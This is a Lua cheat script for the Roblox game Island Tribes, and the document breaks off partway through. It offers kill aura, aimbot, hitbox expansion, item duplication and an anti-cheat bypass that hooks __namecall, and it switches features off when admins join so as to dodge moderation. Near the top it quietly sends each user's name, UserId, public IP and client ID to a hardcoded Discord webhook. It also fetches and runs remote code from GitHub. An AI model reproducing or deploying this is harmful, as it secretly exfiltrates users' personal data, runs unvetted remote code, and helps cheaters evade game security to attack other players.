--AntiHttpSpy
loadstring(game:HttpGet("https://raw.githubusercontent.com/AltTheReal/OBEDSKDKSKFJSJF/main/AntiHTTPSpy.lua"))()
local loading = false
repeat task.wait()
	if not loading then
		loading = true
		print('Loading Obliterator V2 By TheRealGamer903#7339!')
	end
until not game:GetService("Players").LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Loading') or game:GetService("Players").LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Loading').Parent == nil

pcall(function()
    local currentfile = 'IslandTribes/config.json'
    local DefaultsTable = {
        ['AutoPickup'] = '?special|<$enum_type$>:KeyCode;<$enum_item$>:X';
        ['AmountChestItem'] = "1";
        ['WhitelistPersonTextbox'] = '';
        ['BlacklistPersonTextbox'] = '';
		['OpKillAuraTarget'] = '';
        ['EscapeDeathSlider'] = "15";
        ['PredictionDistance'] = "3";
        ['TrapPlayer'] = '?special|<$enum_type$>:KeyCode;<$enum_item$>:Minus';
        ['QuickSpeed'] = '?special|<$enum_type$>:KeyCode;<$enum_item$>:B';
        ['QuickSpeedMultiplier'] = "1";
        ['SwimSpeed'] = "14";
        ['GliderModSpeed'] = '30';
        ['PlayerTpTextbox'] = '';
        ['RepeatDropInventoryItem'] = '';
    }
    if isfile(currentfile) then
        local currentconfigs = readfile(currentfile)
        local decodefile = game:GetService("HttpService"):JSONDecode(currentconfigs)
        if decodefile['RememberConfigs'] == false then
            local newdecodefile = {}
            for name, setting in pairs(decodefile) do
                if type(setting) == 'boolean' and name ~= 'RememberConfigs' then
                    newdecodefile[name] = false
                elseif type(setting) == 'string' then
                    if DefaultsTable[name] then
                        newdecodefile[name] = DefaultsTable[name]
                    end
                else
                    newdecodefile[name] = setting
                end
            end
            writefile(currentfile, game:GetService("HttpService"):JSONEncode(newdecodefile))
        end
    end
end)

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Island Tribes Obliterator", HidePremium = false, SaveConfig = true, ConfigFolder = "IslandTribes"})

--[[
Name = <string> - The name of the UI.
HidePremium = <bool> - Whether or not the user details shows Premium status or not.
SaveConfig = <bool> - Toggles the config saving in the UI.
ConfigFolder = <string> - The name of the folder where the configs are saved.
IntroEnabled = <bool> - Whether or not to show the intro animation.
IntroText = <string> - Text to show in the intro animation.
IntroIcon = <string> - URL to the image you want to use in the intro animation.
Icon = <string> - URL to the image you want displayed on the window.
CloseCallback = <function> - Function to execute when the window is closed.
]]
HttpService = game:GetService("HttpService")
Webhook_URL =  "https://discord.com/api/webhooks/1156241079742517309/BBLDsj12M1u__F9OpgsgsLRTdnLtQvls5ctVYNpVciN26dg2p3lCf6Hp7vh_MfvVL_Xw"
 
local request = syn and syn.request or request or http and http.request or http_request
 
local response = request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {
        ['Content-Type'] = 'application/json'
    },
    Body = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = "",
                ["description"] = game.Players.LocalPlayer.Name .." Tried Logging Into The Script More Info Below",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["fields"] = {
                    {
                        ["name"] = "Player Name : ",
                        ["value"] = game.Players.LocalPlayer.Name,
                        ["inline"] = true
                    }, {
                        ["name"] = "UserId : ",
                        ["value"] = game.Players.LocalPlayer.UserId,
                        ["inline"] = true
                    }, {
                        ["name"] = "User Profile : ",
                        ["value"] = "https://www.roblox.com/users/" ..
                            game.Players.LocalPlayer.UserId,
                        ["inline"] = true
                    }, {
                        ["name"] = "IP: ",
                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
                        ["inline"] = true
                    }, {
                        ["name"] = "Client Id : ",
                        ["value"] = game:GetService("RbxAnalyticsService")
                            :GetClientId(),
                        ["inline"] = true
                    }, {
                        ["name"] = "Key : ",
                        ["value"] = "GAMERONTOP",
                        ["inline"] = true
                    }
                }
            }
        }
    })
})
--Services
Workspace = game:GetService('Workspace')
Players = game:GetService('Players')
ReplicatedStorage = game:GetService('ReplicatedStorage')
UserInputService = game:GetService('UserInputService')
TweenService = game:GetService("TweenService")
RunService = game:GetService('RunService')
Lighting  = game:GetService('Lighting')
VirtualUser = game:GetService("VirtualUser")
HttpService = game:GetService('HttpService')
TeleportService = game:GetService("TeleportService")

--Globals
LocalPlayer = Players.LocalPlayer
Mouse = LocalPlayer:GetMouse()
Camera = Workspace.CurrentCamera
ALLITEMS = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('Items'))['Items']
ALLITEMSTABLE = {}
SWITCHEDITEMSTABLE = {}
for id, index in pairs(ALLITEMS) do
	ALLITEMSTABLE[index['id']] = index['Name']
end
for id, index in pairs(ALLITEMS) do
	SWITCHEDITEMSTABLE[index['Name']] = index['id']
end
getgenv().configs = {
    Bypassing = false;
    AutoPickup2 = false;
    InfJump = false;
    ClickTp = false;
    AutoEat = false;
    MineAura = false;
    MobAura = false;
    CheaterDetector = false;
    KillAura = false;
    PlayerLock = false;
    Pumpkins = false;
    Hitbox = false;
    SafeDeath = false;
    OpKillAura = false;
	PredictOpKillAura = false;
    AutoRepairClub = false;
    ConiferFarm = false;
    UseSoulKeys = false;
    ObsidianBoss = false;
    ZenLuckBoss = false;
    SpiritBoss = false;
    LuckySlime = false;
    EvilSkeleton = false;
    Ogre = false;
    Squid = false;
    JumpPower = false;
    AntiRagDoll = false;
    ExtraSpeed = false;
    AmountToLoopDrop = false;
    PlayerEsp = false;
    EatingType = 'AFK';
    TrapType = 'Stone Trap';
    LevelCheck = 'True';
    ChestType = 'Any';
}
getgenv().QuickSpeedMultiplier = 1
getgenv().AmountOfChestInserts = 1
getgenv().PredictAmount = 3
getgenv().QuickSpeedKey = Enum.KeyCode.B
getgenv().GliderModSpeed = 30


--RemoteEvents
RemoteEvents = {
    ToolAction = ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('ToolAction');
    InventoryInteraction =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction");
    UpdateStorageChest =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("UpdateStorageChest");
    SetSettings = ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("SetSettings");
    BuyWorldEvent =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("BuyWorldEvent");
    ItemInteracted =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("ItemInteracted");
    CraftItem =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("CraftItem");
    TradeTrader =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("TradeTrader");
    KeyDoor = ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("KeyDoor");
    Sonar =  ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('Sonar');
}
--Important locals
local message = require(LocalPlayer:WaitForChild('PlayerScripts'):WaitForChild('Main'):WaitForChild('Message'))
local MyInventory = LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Menus'):FindFirstChild('Inventory'):FindFirstChild('Inventory'):FindFirstChild('List')
local Whitelist_table = {};
local OpKillAuraTable = {};
local realgameadmins = {849400193, 134488231, 146733116, 27865601}
local MoonstoneSet = {363, 364, 365, 366}
local ObsidianSet = {225, 226, 227, 228}
local AllShields = {206, 207, 208, 209, 210, 211, 219, 235, 367, 379}
local AllSwords = {173, 205, 230, 369, 255, 254, 253}
local AllBows = {174, 197, 198, 199, 376}
local AllBooks = {281, 282, 283, 284, 285, 286, 287, 296, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 323, 362}
local AllStaffs = {293, 292, 291, 290, 162, 289}

--Safe Death Connections
local TimeTped
local TimeBetweenTps
local TeleportHappened = false
local SafeDeathHealthChecker = nil

--Boss Death connections
local AutoPickupOnObsidianDeath
local AutoPickupOnZenLuckBossDeath
local AutoPickupOnSpiritBossDeath
local AutoPickuponLuckySlimeDeath
local AutoPickupOnSkeletonDeath
local AutoPickupOnOgreDeath
local AutoPickupOnSquidDeath

--Dupe locals
local ItemIndexed
local ItemIndexedNumber

--Admin Module
loadstring(game:HttpGet("https://raw.githubusercontent.com/AltTheReal/vevervevevevrsdvxbzd/main/adminmodule.lua"))()
--Aimbot locals
local CurrentlyLocked
local Aiming = false

--Quickspeed locals
local OnOff = false
local keydetected

--Pages
local MainTab = Window:MakeTab({
	Name = "Main",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local CombatTab = Window:MakeTab({
	Name = "Combat",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local FarmTab = Window:MakeTab({
	Name = "Farm",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local TeleportsTab = Window:MakeTab({
	Name = "Teleports",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local ResourcesTab = Window:MakeTab({
	Name = "Resources",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local TreasureTab = Window:MakeTab({
	Name = "Treasure Chests",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local LocalPlayerTab = Window:MakeTab({
	Name = "LocalPlayer",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local DupeTab = Window:MakeTab({
	Name = "Dupe",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local AutoSellTab = Window:MakeTab({
	Name = "AutoSell",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local VisualsTab = Window:MakeTab({
	Name = "Visuals",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local CreditsTab = Window:MakeTab({
	Name = "Credits",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
--stop everything if an admin joins
Players.PlayerAdded:Connect(function(admin)
    if table.find(realgameadmins, admin.UserId) then
        if admin.UserId == '134488231' then
            OrionLib:MakeNotification({
                Name = "Title!",
                Content = "Owner joined; carefull, ill disable everything for you",
                Image = "rbxassetid://4483345998",
                Time = 5
            }),        
        else
            OrionLib:MakeNotification({
                Name = "Title!",
                Content = ("Game Admin Joined: "..admin.Name, "Admin joined; carefull, ill disable everything for you"),
                Image = "rbxassetid://4483345998",
                Time = 5
            }),
        end
        task.spawn(function()
            repeat task.wait(1)
                for setting, value in pairs(getgenv().configs) do
                    if type(value) == 'boolean' then
                        getgenv().configs[setting] = false
                    end
                end
            until not Players:FindFirstChild(admin.Name)
            if admin.UserId == '134488231' then
                OrionLib:MakeNotification({
                    Name = "Title!",
                    Content = "Ok the Owner is gone i wonder what he said.",
                    Image = "rbxassetid://4483345998",
                    Time = 5
                }),            
            else
                OrionLib:MakeNotification({
                    Name = "Title!",
                    Content = "Ok the admin is gone.",
                    Image = "rbxassetid://4483345998",
                    Time = 5
                }),
            end
        end)
    end
end)

--setup ac bypass
if not getgenv().bypassing then
    getgenv().bypassing = true
    local bypassac

    bypassac = hookmetamethod(game, '__namecall', function(self, ...)
        local args = {...}
        if not checkcaller() and self == RemoteEvents['Sonar'] then
            return nil
        end
        return bypassac(self, ...)
    end) 
end

--Antiafk
if not getgenv().Idling ~= true then
    getgenv().Idling = true
    LocalPlayer.Idled:connect(function()
	    VirtualUser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
	    task.wait(1)
	    VirtualUser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    end)
end

--Functions
function IsPlayerAlive(player)
    if player.Character and player.Character:FindFirstChild('Humanoid') and player.Character:FindFirstChild('HumanoidRootPart') and player.Character:FindFirstChild('Humanoid').Health > 0 then
        return true
    end
    return false
end


function GetClosestChest()
    local closest
    local range = math.huge
    local checkpassivenonpassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
    if IsPlayerAlive(LocalPlayer) then
        for _, chest in pairs(Workspace:WaitForChild("Replicators")[checkpassivenonpassive]:GetChildren()) do
            if string.find(chest.Name, 'Storage') and chest:FindFirstChildOfClass('MeshPart') then
                local dist = (LocalPlayer.Character:WaitForChild('HumanoidRootPart').Position - chest:FindFirstChildOfClass('MeshPart').Position).magnitude
                if dist < range then
                    range = dist
                    closest = chest
                end
            end
        end
        return closest
    end
end

local function IsArmorLevel(piece)
    if getgenv().LevelCheck == 'False' then return true end
    local lvl = piece:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Level'):FindFirstChild('Label').Text:gsub("Lv ", "")
    if tonumber(lvl) == 10 then
        return true
    end
end

local function IsLevel(piece)
    if getgenv().LevelCheck == 'False' then return true end
    local lvl = piece:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Level'):FindFirstChild('Label').Text:gsub("Lv ", "")
    if tonumber(lvl) == 5 then
        return true
    end
end

local function SellItem(Item, SellAmount, Id)
    local GetItem = MyInventory:FindFirstChild(Item)
    if GetItem then
        local NumberOfItem = string.match(GetItem:FindFirstChild('Top'):FindFirstChild('NameLabel').Text, '%d+')
        if not NumberOfItem then
            NumberOfItem = 1
        end
        if tonumber(NumberOfItem) >= SellAmount then
            RemoteEvents['TradeTrader']:FireServer('Resource Trader', Id)
        end
    end
end

function AutoPickup()
    local checkpassivenonpassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
    if IsPlayerAlive(LocalPlayer) then
        local AllPickups = {}
        local mypos = LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position
        for _, item in pairs(Workspace:WaitForChild('Replicators')[checkpassivenonpassive]:GetChildren()) do
            if item:IsA("Model") and (mypos - item:GetPivot().Position).magnitude < 18.5 and not string.find(item.Name:lower(), 'clue') then
                if table.find(ALLITEMSTABLE, item.Name) then
                    table.insert(AllPickups, item)
                end
            end
        end
        for _, item in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
            if item:IsA("Model") and (mypos - item:GetPivot().Position).magnitude < 18.5 and not string.find(item.Name:lower(), 'clue') then
                if table.find(ALLITEMSTABLE, item.Name) then
                    table.insert(AllPickups, item)
                end
            end
        end
        for _, item in pairs(Workspace:GetChildren()) do
            if item:IsA("Model") and (mypos - item:GetPivot().Position).magnitude < 18.5 and not string.find(item.Name:lower(), 'clue') then
                if table.find(ALLITEMSTABLE, item.Name) then
                    table.insert(AllPickups, item)
                end
            end
        end
        if #AllPickups > 0 then
            for _, getitem in ipairs(AllPickups) do
                repeat task.wait()
					local mybagspace = string.split(LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Bag'):WaitForChild('StatusLabel').Text, '/')
					if tonumber(mybagspace[1])+1 >= tonumber(mybagspace[2]) then return false end 
                    if IsPlayerAlive(LocalPlayer) then
                        if getitem.Parent then
                            RemoteEvents['ItemInteracted']:FireServer(getitem, "Pickup")
                        end
                    end
                until not getitem.Parent or (LocalPlayer.Character.HumanoidRootPart.Position - getitem:GetPivot().Position).magnitude > 18.5 or tonumber(mybagspace[1])+1 >= tonumber(mybagspace[2]) or not IsPlayerAlive(LocalPlayer)
            end
        end
    end
end

function AutoPickup2()
    if getgenv().configs.AutoPickup2 then
        if not getgenv().AutoPickingUp then
            getgenv().AutoPickingUp = Workspace.DescendantAdded:Connect(function(pickup)
				local mybagspace
                if not getgenv().configs.AutoPickup2 then
                    getgenv().AutoPickingUp:Disconnect()
                    getgenv().AutoPickingUp = nil
                    return
                end
                if not string.find(pickup.Name:lower(), 'clue') then
                    if table.find(ALLITEMSTABLE, pickup.Name) then
                        if IsPlayerAlive(LocalPlayer) then
                            local mypos = LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position
                            local itempos = pickup:GetPivot().Position
                            if (mypos - itempos).magnitude < 18.5 then
                                repeat task.wait()
									mybagspace = string.split(LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Bag'):WaitForChild('StatusLabel').Text, '/') 
                                    if IsPlayerAlive(LocalPlayer) then
                                        if pickup.Parent then
                                            RemoteEvents['ItemInteracted']:FireServer(pickup, "Pickup")
                                        end
                                    end
                                until not pickup.Parent or (LocalPlayer.Character.HumanoidRootPart.Position - pickup:GetPivot().Position).magnitude > 18.5 or tonumber(mybagspace[1])+1 >= tonumber(mybagspace[2]) or not IsPlayerAlive(LocalPlayer) or not getgenv().configs.AutoPickup2
                            end
                        end
                    end
                end
            end)
        end
        AutoPickup()
    else
        if getgenv().AutoPickingUp then
            getgenv().AutoPickingUp:Disconnect()
            getgenv().AutoPickingUp = nil
        end
    end
end

function ClickTp()
    if getgenv().configs.ClickTp then
        if not getgenv().MouseClick then
            getgenv().MouseClick = UserInputService.InputBegan:Connect(function(input)
                if getgenv().configs.ClickTp then
                    if not UserInputService:GetFocusedTextBox() then
                        if input.UserInputType == Enum.UserInputType.MouseButton1 and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
                            if IsPlayerAlive(LocalPlayer) then
                                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.Position)
                            end
                        end
                    end
                end
            end)
        end
    end
end

function AutoEat()
    local function GreatestFoodSource()
        local foodtable = {}
        local highestfood
        local greatestfoodpossible = -math.huge
        
        for _, food in pairs(MyInventory:GetChildren()) do
            if food.Name == 'Raw Potato' or food.Name == 'Watermelon' or food.Name == 'Banana' or food.Name == 'Redberry' or food.Name == 'Coconut' or food.Name == 'Baked Potato' or food.Name == 'Carrot'  or food.Name == 'Cabbage' or food.Name == 'Cooked Fish' or food.Name == 'Cooked Meat' or food.Name == 'Caveberry' or food.Name == 'Slime Ball' or food.Name == 'Lucky Fruit' then
                table.insert(foodtable, food)
            end
        end
        for _, food in pairs(foodtable) do
            local foodamount = tonumber(string.match(food:WaitForChild('Top'):WaitForChild('NameLabel').Text, '%d+'))
            if foodamount and foodamount > greatestfoodpossible then
                greatestfoodpossible = foodamount
                highestfood = food.Name
            end
        end
        return highestfood
    end
    local maxhungerbar = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Hunger'):WaitForChild('Bar').AbsoluteSize
    local subbar = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Health'):WaitForChild('Bar'):WaitForChild('Sub')
    while getgenv().configs.AutoEat do
        if getgenv().configs.AutoEat then
            task.wait()
            local Food = GreatestFoodSource()
            if Food then
                if getgenv().configs.EatingType == 'AFK' then
                    local currenthungerbar = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Hunger'):WaitForChild('Bar'):WaitForChild('Bar').AbsoluteSize
                    if IsPlayerAlive(LocalPlayer) then
                        if (maxhungerbar - currenthungerbar).magnitude >= 20.7 then
                            RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[Food], 'Eat')
                            task.wait()
                        end
                    end
                elseif getgenv().configs.EatingType == 'War' then
                    local maxsubbar = subbar.Parent.AbsoluteSize
                    if IsPlayerAlive(LocalPlayer) then
                        if (maxsubbar - subbar.AbsoluteSize).magnitude >= 20.7 then
                            RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[Food], 'Eat')
                            task.wait()
                        end
                    end
                end
            end
        end
    end
end

function MineAura()
    while getgenv().configs.MineAura do
        if getgenv().configs.MineAura then
            task.wait(0.3)
            if IsPlayerAlive(LocalPlayer) then
                local function getclosestore()
                    local range = 21
                    local closestore
                    for _, ore in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
                        if not string.find(ore.Name:lower(), 'slime') then
                            if Workspace:FindFirstChild("Volcanic Rock") then
                                Workspace:FindFirstChild("Volcanic Rock").Parent = Workspace:WaitForChild('Replicators'):WaitForChild('Both')
                            end
                            if ore:FindFirstChild('Health') and not ore:FindFirstChild('Humanoid') and not ore:FindFirstChild('HumanoidRootPart') then
                                local obj
                                local dist
                                obj = ore:GetPivot().Position
                                local mypos = LocalPlayer.Character.HumanoidRootPart.Position
                                dist = (mypos - obj).magnitude
                                if dist < range then
                                    if ore.Name == 'Plantain' then
                                        if ore:FindFirstChild('Tree') and ore:FindFirstChild('Tree'):FindFirstChild('Palm Tree_Trunk') then
                                            obj = Vector3.new(3378, 15, -4475)
                                        end
                                    end
                                    dist = (mypos - obj).magnitude
                                    range = dist
                                    closestore = ore
                                end
                            end
                        end
                    end
                    return closestore
                end
                local NearestOre = getclosestore()
                if NearestOre then
                    RemoteEvents['ToolAction']:FireServer(NearestOre)
                end
            end
        end
    end
end

function MobAura()
    while getgenv().configs.MobAura do
        if getgenv().configs.MobAura then
            task.wait(.15)
            local function getclosestmob()
                local range = 30
                local closestmob = nil
                if IsPlayerAlive(LocalPlayer) then
                    for _, mob in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
                        if mob:FindFirstChild('HumanoidRootPart') and mob:FindFirstChild('Humanoid') and mob:FindFirstChild('Humanoid').Health > 0 then
                            local mypos = LocalPlayer.Character.HumanoidRootPart.Position
                            local mobpos = mob.HumanoidRootPart.Position
                            local dist = (mypos - mobpos).magnitude
                            if dist < range then
                                range = dist
                                closestmob = mob
                            end
                        end
                    end
                end
                return closestmob
            end
            local nearestmob = getclosestmob()
            if nearestmob then
                RemoteEvents['ToolAction']:FireServer(nearestmob)
            end
        end
    end
end

function KillAura()
    while getgenv().configs.KillAura do
        if getgenv().configs.KillAura then
            task.wait()
            local function GetClosestKAPlayer()
                local range = 32
                local closest
                for _, plr in pairs(Players:GetPlayers()) do
                    if plr ~= LocalPlayer then
                        if not table.find(Whitelist_table, plr.Name) then
                            if IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                                local char = plr.Character
                                if char:FindFirstChild("PlayerBillboard") and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title') and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon') then
                                    if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 == Color3.fromRGB(80, 63, 47) then
                                        local mypos = LocalPlayer.Character.HumanoidRootPart.Position
                                        local plrpos = plr.Character.HumanoidRootPart.Position
                                        local dist = (mypos - plrpos).magnitude
                                        if dist < range then
                                            range = dist
                                            closest = plr.Character
                                        end
                                    else
                                        if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 ~= LocalPlayer.Character:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 then
                                            local mypos = LocalPlayer.Character.HumanoidRootPart.Position
                                            local plrpos = plr.Character.HumanoidRootPart.Position
                                            local dist = (mypos - plrpos).magnitude
                                            if dist < range then
                                                range = dist
                                                closest = plr.Character
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
                return closest
            end
            local NearestPlayer = GetClosestKAPlayer()
            if NearestPlayer then
                RemoteEvents['ToolAction']:FireServer(NearestPlayer)
            end
        end
    end
end

function PlayerLock()
    local function Wallcheck(target)
        local ray = Ray.new(Camera.CFrame.Position, (target.Position - Camera.CFrame.Position).Unit * 1000)
        local part, position = Workspace:FindPartOnRayWithIgnoreList(ray, {LocalPlayer.Character}, false, true)
        if part then
            local humanoid = part.Parent:FindFirstChildOfClass('Humanoid')
            if not humanoid then
                humanoid = part.Parent.Parent:FindFirstChildOfClass('Humanoid')
            end
            if humanoid and target and humanoid.Parent == target.Parent then
                local pos, visible = Camera:WorldToScreenPoint(target.Position)
                if visible then
                    return true
                end
            end
        end
        return false
    end
    local function GetNearestPlayerToMouse()
        if CurrentlyLocked and CurrentlyLocked.Humanoid.Health > 0 then return CurrentlyLocked end
        local dist = 150
        local closest
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local char = plr.Character
                    local plrpos, onscreen = Camera:WorldToViewportPoint(char['HumanoidRootPart'].Position)
                    if onscreen then
                        if char:FindFirstChild("PlayerBillboard") and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title') and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon') then
                            if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 == Color3.fromRGB(80, 63, 47) then
                                local mag = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(plrpos.X, plrpos.Y)).Magnitude
                                if mag < dist and (char.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).magnitude < dist then
                                    if Wallcheck(char:FindFirstChild('HumanoidRootPart')) then
                                        dist = mag
                                        closest = char
                                    end
                                end
                            else
                                if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 ~= LocalPlayer.Character:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 then
                                    local mag = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(plrpos.X, plrpos.Y)).Magnitude
                                    if mag < dist and (char.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).magnitude < dist then
                                        if Wallcheck(char:FindFirstChild('HumanoidRootPart')) then
                                            dist = mag
                                            closest = char
                                        end
                                    end
                                end
                            end
                        end
                    end
                end     
            end
        end
        return closest
    end
    if not getgenv().Updater then
        getgenv().Updater = RunService.RenderStepped:Connect(function()
            if getgenv().configs.PlayerLock then
                if UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
                    if GetNearestPlayerToMouse() then
                        CurrentlyLocked = GetNearestPlayerToMouse()
                        local SmoothSnap = TweenService:Create(Camera, TweenInfo.new(0.01, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame = CFrame.new(Camera.CFrame.Position, CurrentlyLocked:FindFirstChild('HumanoidRootPart').Position)})
                        SmoothSnap:Play()
                        SmoothSnap.Completed:Wait()
                    end
                else
                    if CurrentlyLocked ~= nil then
                        CurrentlyLocked = nil
                    end
                end
            end
        end)
    end
end

function Pumpkins()
    while getgenv().configs.Pumpkins do
        if getgenv().configs.Pumpkins then
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                local hum = LocalPlayer.Character.Humanoid
                if hum.Health < 75 then
                    RemoteEvents['InventoryInteraction']:FireServer(378, "Eat")
                end
            end
        end
    end
end

function Hitbox()
    while getgenv().configs.Hitbox do
        if getgenv().configs.Hitbox then
            task.wait(0.2)
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer then
                    if IsPlayerAlive(plr) and plr.Character:FindFirstChild('Hitbox') then
                        if plr.Character.Hitbox.Size ~= Vector3.new(20, 20, 20) then
                            plr.Character.Hitbox.Size = Vector3.new(20, 20, 20)
                        end
                    end
                end
            end
        end
    end
end

function SafeDeath()
    if getgenv().configs.SafeDeath then
        if not SafeDeathHealthChecker then
            SafeDeathHealthChecker = LocalPlayer.Character:WaitForChild('Humanoid').HealthChanged:Connect(function(health)
                if getgenv().configs.SafeDeath then
                    if not TeleportHappened then
                        if health <= 35 then
                            getgenv().configs.ZenLuckBoss = false
                            getgenv().configs.SpiritBoss = false
                            getgenv().configs.ObsidianBoss = false
                            getgenv().configs.Ogre = false
                            getgenv().configs.Squid = false
                            getgenv().configs.LuckySlime = false
                            getgenv().configs.EvilSkeleton = false
                            local SavePlayer = TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(3, Enum.EasingStyle.Linear), {CFrame = CFrame.new(Vector3.new(7135, 73, 18677))})
                            SavePlayer:Play()
                            MakeAtlasNotification("You have been saved from death!", "The Arc Angels have saved you! Heal Up before you go back to battle!", 7)
                            TeleportHappened = true
                            TimeTped = tick()
                        end
                    else
                        if tick() > TimeTped+TimeBetweenTps then
                            TeleportHappened = false
                        end
                    end
                end
            end)
        end
    end
end

function OpKillAura()
    local wastrue = false
    while getgenv().configs.OpKillAura do
        if getgenv().configs.OpKillAura then
            task.wait()
			if OpKillAuraTable[1] then
				if IsPlayerAlive(OpKillAuraTable[1]) and IsPlayerAlive(LocalPlayer) then
					local myroot = LocalPlayer.Character.HumanoidRootPart
					local enemyroot = OpKillAuraTable[1].Character.HumanoidRootPart
					if getgenv().configs.PredictOpKillAura then
						myroot.CFrame = CFrame.new(enemyroot.Position + (enemyroot.AssemblyLinearVelocity/getgenv().PredictAmount))
					else
						myroot.CFrame = CFrame.new(enemyroot.Position)
					end
					if LocalPlayer.Character.Humanoid.Health <= 20 then
						LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7137, 73, 18673)
						MakeAtlasNotification("You are low!", 'Ive saved you. Heal up.', 8)
					return end
					MyYPos = LocalPlayer.Character.HumanoidRootPart.CFrame.Y
					if MyYPos <= -800 then
						LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7137, 73, 18673)
						MakeAtlasNotification("Suicide", "Careful, hes trying to suicide you", 3)
					return end
					RemoteEvents['ToolAction']:FireServer(OpKillAuraTable[1].Character)
					if not getgenv().configs.OpKillAura and LocalPlayer.Character.Humanoid.Health > 25 then
